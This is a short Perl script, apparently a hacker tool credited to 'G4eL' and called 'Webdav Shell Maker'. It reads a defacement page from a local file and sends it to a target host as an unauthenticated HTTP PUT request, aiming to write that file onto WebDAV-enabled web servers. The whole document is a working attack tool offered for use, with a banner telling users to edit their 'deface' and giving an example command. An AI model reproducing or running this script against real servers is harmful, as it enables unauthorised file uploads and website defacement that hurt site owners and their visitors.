#!/usr/bin/perl
use strict;
use IO::Socket::INET;
use File::Slurp;
# By G4eL
if ($#ARGV != 1) {
system $^O eq 'MSWin32' ? 'cls' : 'clear';
print <<EOTEXT;
############################################

G4eL - Webdav Shell Maker

1 : url or ip
2 : filename

( Edit your deface in "deface.txt" )

Example : perl webdav.pl site.com hello.txt
############################################
EOTEXT
exit(1);
}
my ($ip,$file) = @ARGV;
my ($sock,$length);
my $deface = read_file('deface.txt'); # Your deface
$length = length($deface);
my $reqq =
"PUT /$file HTTP/1.0\r\n".
"Content-Type: text/html\r\n".
"Content-Length: $length\r\n".
"Host: $ip\r\n".
"\r\n".
"$deface\r\n";

$sock = IO::Socket::INET->new(PeerAddr => "$ip", PeerPort => 80, Proto => "tcp") or next;
print $sock $reqq;
close($sock);
